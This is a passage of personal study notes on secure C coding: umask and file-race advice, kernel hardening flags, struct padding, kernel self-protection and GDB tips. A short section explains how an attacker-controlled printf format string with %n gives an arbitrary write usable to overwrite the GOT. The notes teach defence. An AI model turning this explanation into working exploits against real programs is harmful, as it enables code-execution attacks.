each to one of: the current real UID, the current effective UID, or the current saved set-user-ID."* - Linux man page

#### File (/directory) permissions

FIO01-C "*Be careful using functions that use file names for identification*" (more: <https://wiki.sei.cmu.edu/confluence/display/c/FIO01-C.+Be+careful+using+functions+that+use+file+names+for+identification>). \
For instance, if the parent dir is writable and thus your file/dir could be moved and replaced by malicious data.

The umask decides permissions on file creation, this might need to be restricted. Keep an eye on the umask!
Umask is used e.g. in calls to open() and mkdir(). The permissions are calculated as: ¬umask AND arg (inverse of umask ANDed with the permissions given in call).

Set the umask/permissions properly before the file is created, otherwise the attacker could access the file in between creation and changed permissions (race condition).

C11 added fopen_s, which to the extent supported by the OS, *"use a file permission that prevent other users from accessing the file"* (pg. 431) (more <https://en.cppreference.com/w/c/io/freopen>).

## Recommendations (Chap. 9)

TODO

## End of book

-> BOOKMARK: you are here 432 <- \
**- Here ends the book! -** \
**Other notes and reading below.**





## Off-Topic

### Memset vs global zero initializer

Initialize struct to zero with {0} is cleaner,
and also more hardware independent, than memset.

compare
```
    struct sockaddr_in client_addr;
    memset(&client_addr, 0, sizeof client_addr);
```
and
```
    struct sockaddr_in client_addr = {0};
```

With memset all fields will simply have the value 0 written to them,
however we then assume that 0 has a bit representation
of all zero bits¹ and that NULL pointer = 0 as well,
but this is in fact hardware dependent (although uncommon) [citation needed].
The universal zero initializer, {0}, on the other hand,
writes 0 to the first element, but the remaining elements
will correctly be initialized
"as objects that have static storage duration" [according to the standard].

¹ char a = 0; does not have to have representation 0000 0000 in memory?
  in that case, how about a = 0b0; ?



### Kernel Flags

It could also be of interest to have a look on possible kernel flags and other system-security options for security. For instance, as explained here: https://www.starlab.io/blog/the-linux-security-hardening-checklist-for-embedded-systems


Which mentions, for example;
_"
CONFIG_SHUFFLE_PAGE_ALLOCATOR - Increases the randomness of page allocation addresses. [Security recommendation: CONFIG_SHUFFLE_PAGE_ALLOCATOR=y] 

Kprobes / Oprofile / GCov - Enables tracing the kernel, and filesystems, potentially leading to information disclosure and facilitating certain reverse engineering tasks. On a deployed system, these should both be disabled and removed from the kernel.

STACKPROTECTOR - Enables GCC's stack protector for kernel memory, making it harder to exploit various kernel stack vulnerabilities. [Security recommendation: STACKPROTECTOR=y]

STACKPROTECTOR_STRONG - Enables stack canaries (under specific conditions) making it harder to exploit various kernel stack vulnerabilities. [Security recommendation: STACKPROTECTOR_STRONG=y]

VMAP_STACK - Enables virtual stack mappings with explicit guard pages, making it more difficult to execute various kernel stack vulnerabilities. [Security recommendation: VMAP_STACK=y]

REFCOUNT_FULL - Forces a full validation of various reference counts on condition, potentially preventing scenarios which could lead to a use after free vulnerability. [Security recommendation: REFCOUNT_FULL=y]
"_


Although not detailed in this article, kernel flags might be needed to enable CPU features, such as IOMMU, memory protections, ..., Intel TSX and Intel MPX are mentioned in the provided link.
Could be something to look into, however it is largely architecture and vendor specific. This might get more and more important as CPUs gain more such features.

For the purpose of this article, features such as
ASLR (randomize_va_space=2, [short_on_ASLR]),
Intel CET (i.e. providing control-flow integrity protection, _"An upcoming Intel® processor feature that blocks return/jump-oriented programming (ROP) attack"_ [what_is_Intel-CET])
are relevant however (see provided links).




- https://www.starlab.io/blog/the-linux-security-hardening-checklist-for-embedded-systems


Extras:

[short_on_ASLR] - https://securityetalii.es/2013/02/03/how-effective-is-aslr-on-linux-systems/
[what_is_Intel-CET] - https://gitlab.com/cet-software/cet-smoke-test/-/wikis/CET-status


### GCC Flags

MOVED!

NOTE! This chapter is moved here:

https://github.com/Eliot-Roxbergh/examples/blob/master/c_programming/development_tips/gcc_flags.md

with small build example:
https://github.com/Eliot-Roxbergh/examples/blob/master/c_programming/development_tips/gcc_build_example.txt


### printf(foo)

Printf(foo) //exploitable, if foo attacker controlled can input %n e.g.
// this is not the same as printf("%s", foo);

Also, %n is dangerous. It writes (the number of bytes printed by printf) to the address of the variable given ... potential arbitrary write!
	For instance, this could be used to overwrite GOT (of ELF binary) and achieve code execution redirection.


### Structure Packing and Padding

Dirty summary of [packing_and_padding]

#### On Padding

("Remember that not all the world is Intel or ARM", assumptions below might not hold then... real low-level stuff)
Usually variables are padded so they start on "even" addresses, which can be risky if you make certain assumptions regarding structs and their layout. The usual case is that char can start anywhere, 2-byte short should begin at even address, and 4-byte int address evenly divisable by 4, etc.
This is architecture dependent and only (?) to ensure less instructions are necessary, otherwise multiple access might be necessary.
A struct is generally aligned to "its widest scalar member" - pointers points to bytes so really there shouldnt be any weird offset? (struct foo* a = ... ?)
The struct has trailing padding ("out to its stride address"), i.e. if the widest element is 8B the struct will end as if the last element in struct was 8B (rest padding). uhm why?
(Section on bitfields (they look like this ->  int apa:2; /*2 bits*/) ignoring this for now..)

#### Optimize

Can reorder struct to decrease padding (There are multiple ways, and "The simplest way to eliminate slop is to reorder the structure members by decreasing alignment.").
If we have a struct in a struct each struct will have ending padding which might waste space (as compared if the same data was not in an inner struct but directly in the outer).
Since C is low-level, the compiler may not reorder the fields to save memory - as obivously this could break assumptions of the C programmer. The Rust language may on the other hand reorder structure fields.

But, "There are two more issues: readability and cache locality".
"When possible, it is better to reorder fields so they remain in coherent groups with semantically related pieces of data kept close together."
"On 64-bit x86 a cache line is 64 bytes beginning on a self-aligned address; on other platforms it is often 32 bytes." (CPU gets the whole block at once)

But it gets more complicated... for multi-threading; "cache line bouncing. To minimize expensive bus traffic, you should arrange your data so that reads come from one cache line and writes go to another in your tighter loops. And yes, this sometimes contradicts the previous guidance about grouping related data in the same cache-line-sized block".

Additonal techniques; Slim struct as much as possible e.g. use multiple 1-bit bitfields instead of multiple booleans (bool in C is just an int) (some argue against this? It might need many more instructions to get the right bit from the addressed byte [bitfields-bool]). Unions can also work to decrease the size but is of course potentially dangerous.

#### More

Different ways are mentioned to override default padding (-fpack-struct, #pragma pack) or inspect padding (clang -Wpadded, or static_assert to check the sizeof, gdb pahole). But elements are never reordered.
Pragma pack(N) forces compiler to align to N bytes - for instance, #pragma pack(1) would (1-)byte align everything (implied is that start (address) of struct is not aligned either) - can have major performance problems [pragma-pack]!

C++ is like C except for "classes that look like structs".
"Rust follows C-like packing rules [ONLY] if a structure is annotated with "repr(C)". Otherwise (by default) all bets are off:" the compiler will optimize and REORDER.

### Div

A style (recommendation?) is to write defines with parathesis: #define apa (123) [define_parenthesis]

Remember that short, int, long does not have exact mandated sizes in specification. For instance, int is defined to be "atleast 2 bytes" and is usually 4 bytes. From C99 use int32_t, uint32_t et al (<stdint.h>), if you rely on exact size.  --> https://en.cppreference.com/w/c/types/integer

### C in Kernel (Kernel Self-Protection)

Some notes from the 2019 talk [c-in-kernel]. That is, hardening kernel itself by "Kernel Self-Protection Project (KSPP)".

- Variable Lengths Arrays (VLA), and _alloca()_, are dangerous if overflow.
They are also slow (13% slower in kernel than fixed size).
Detect them with -Wvla, and otherwise at least enable _-fstack-clash-protection_.
VLA has been removed from the kernel.

- Switch case fall-through, how to know if bug or intentional (i.e. a fall-through into the next case).
There is some kind of comment (e.g. /\* fall through \*/), or statment, you can add that will tell the compiler that this is in fact not a bug, and otherwise it can warn with _-Wimplicit-fallthrough_.

- Arithmetic overflow detection, use _-fsanitize=unsigned-integer-overflow_, _-fsanitize=signed-integer-overflow_ (Clang) if possible. Note, avoid intentional overflows (or write a comment to clarify it was intentional).

- Bounds checking is good and only adds <2% performance hit.

- strcpy, sprintf, memcpy etc. are dangerous, avoid (see safer alternatives mentioned earlier).

#### Hardware features (primarily)

- Memory tagging in hardware (e.g. ARMv8.5 Memory Tagging Extension (MTE) ). Allow only addresses within the same tag's memory areas.

- Control Flow Integrity (forward/backward edges), different methods such as, use a different stack ("shadow stack") for just return addresses, or in hardware Intel CET (similar read-only shadow stack)

#### Additional Reading

Kernel Self-Protection: https://www.kernel.org/doc/html/latest/security/self-protection.html

Kernel-hardening mailing list: https://www.openwall.com/lists/kernel-hardening/


### GDB Debugging

Good general intro in "C in a Nutshell" pg. 731-765

**For specifics see my other notes:** _https://github.com/Eliot-Roxbergh/examples/tree/master/c_programming/development_tips_,

mainly for GDB _https://github.com/Eliot-Roxbergh/examples/blob/master/c_programming/development_tips/gdb.txt_

#### Debug Symbols

Build with (GCC) -g to include debug information (e.g. source code path, line numbers, variable names).
GDB will then use the corresponding source code to aid the debugging, the path can also be changed with the "directory" command. Also "set substitute-path". Or set the path at build time with "-fdebug-prefix-map".
"GDB uses debug info stored in DWARF format to find source level info. DWARF is pretty straightforward format - basically, it’s a tree of DIEs (Debug Info Entries) that describes object files of your programs along with variables and functions."
[GDB-debug-info]

#### Code view

-tui (or ctrl+x AND ctrl+a) to see source code in parallel.
Example:
gdb /usr/sbin/tool -tui -directory ~/src/

Can also write ctrl+x 1 or ctrl+x 2, the latter shows both C and assembly side by side. [GDB-TUI]


## References


[utf8] - https://utf8everywhere.org \
[code_book] - Secure Coding in C and C++ (SEI Series in Software Engineering) 2nd Edition, 978-0321822130, Robert Seacord, 2013 \
[syscall_instr] - https://stackoverflow.com/questions/12806584/what-is-better-int-0x80-or-syscall-in-32-bit-code-on-linux, https://articles.manugarg.com/systemcallinlinux2_6.html, https://www.tutorialspoint.com/assembly_programming/assembly_system_calls.htm \
[kernelspace] - https://unix.stackexchange.com/questions/87625/what-is-difference-between-user-space-and-kernel-space \
[vDSO_intro] - https://en.wikipedia.org/wiki/VDSO, https://www.linuxjournal.com/content/creating-vdso-colonels-other-chicken \
[ROP] - https://www.youtube.com/watch?v=XZa0Yu6i_ew, https://en.wikipedia.org/wiki/Return-oriented_programming, https://en.wikipedia.org/wiki/Blind_return_oriented_programming, https://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html, https://www.youtube.com/watch?v=zaQVNM3or7k \
[c11_annex-k] - http://www.open-std.org/jtc1/sc22/wg14/www/docs/n1967.htm \
[dynamic_allocation] - https://stackoverflow.com/questions/21370410/why-shouldnt-we-have-dynamic-allocated-memory-with-different-size-in-embedded-s \
[restrict_keyword] - https://www.tutorialspoint.com/restrict-keyword-in-c \
[restrict_keyword-2] - http://web.archive.org/web/20080107035604/http://www.cellperformance.com/mike_acton/2006/05/demystifying_the_restrict_keyw.html \
[object-size-checking] - https://gcc.gnu.org/legacy-ml/gcc-patches/2004-09/msg02055.html \
[c-in-kernel] - https://www.youtube.com/watch?v=FY9SbqTO5GQ,  Making C Less Dangerous in the Linux kernel (https://linux.conf.au 2019, Kees Cook). Related: https://www.kernel.org/doc/html/latest/security/self-protection.html

[ASLR-windows] - https://www.fireeye.com/blog/threat-research/2020/03/six-facts-about-address-space-layout-randomization-on-windows.html \
[ELF-file] - https://wiki.osdev.org/ELF \
[ELF-file-1] - https://stackoverflow.com/questions/23379880/difference-between-program-header-and-section-header-in-elf, https://en.wikipedia.org/wiki/Executable_and_Linkable_Format \
[GOT_PIE] - https://en.wikipedia.org/wiki/Position-independent_code#Technical_details \
[dynamic-libraries] - pp. 841-857, The Linux Programming Interface, Michael Kerrisk, 2010, 978-1-59327-220-3. \
[linking_and_PLT] - https://www.youtube.com/watch?v=UdMRcJwvWIY, https://stackoverflow.com/questions/20486524/what-is-the-purpose-of-the-procedure-linkage-table \
[ASLR_Linux_bypass] - https://www.youtube.com/watch?v=mPbHroMVepM \
[lazy-binding] - http://www.qnx.com/developers/docs/qnxcar2/index.jsp?topic=%2Fcom.qnx.doc.neutrino.prog%2Ftopic%2Fdevel_Lazy_binding.html \
[LTO] - https://gcc.gnu.org/wiki/LinkTimeOptimization, (bonus: https://en.wikipedia.org/wiki/Translation_unit_%28programming%29) \
[Microsoft-EncodePointer] - https://devblogs.microsoft.com/oldnewthing/20201113-00/?p=104447 \
[linux-proc] - https://man7.org/linux/man-pages/man5/proc.5.html

[C-undefined-llvm] - http://blog.llvm.org/2011/05/what-every-c-programmer-should-know.html (3-part series) \
[C-undefined-regehr] - https://blog.regehr.org/archives/213 (3-part series)

Extra: https://maplant.com/gc.html (TODO code example to consider, implement garbage collector in C)

### Off-topic

[gcc_recommended_flags] - https://developers.redhat.com/blog/2018/03/21/compiler-and-linker-flags-gcc/
			    (also more reading here: https://security.stackexchange.com/questions/24444/what-is-the-most-hardened-set-of-options-for-gcc-compiling-c-c, https://wiki.debian.org/Hardening) \
[fstack-protector] - https://lists.llvm.org/pipermail/cfe-dev/2017-April/053662.html, https://outflux.net/blog/archives/2014/01/27/fstack-protector-strong/ \
[GOT-RELRO-hardening] - https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro \
[glibc-malloc] - https://sourceware.org/glibc/wiki/MallocInternals

[GCC-visibility] - https://gcc.gnu.org/wiki/Visibility \
[packing_and_padding] - http://www.catb.org/esr/structure-packing/ \
[bitfields-bool] - https://devblogs.microsoft.com/oldnewthing/20081126-00/?p=20073 \
[pragma-pack] - https://devblogs.microsoft.com/oldnewthing/20200103-00/?p=103290 \
[define_parenthesis] - https://stackoverflow.com/questions/9081479/is-there-a-good-reason-for-always-enclosing-a-define-in-parentheses-in-c

[c-in-kernel] - https://www.youtube.com/watch?v=FY9SbqTO5GQ,  Making C Less Dangerous in the Linux kernel (https://linux.conf.au 2019, Kees Cook). Related: https://www.kernel.org/doc/html/latest/security/self-protection.html

[GDB-debug-info] - https://alex.dzyoba.com/blog/gdb-source-path/ \
[GDB-TUI] - http://www.cs.fsu.edu/~baker/ada/gnat/html/gdb_23.html

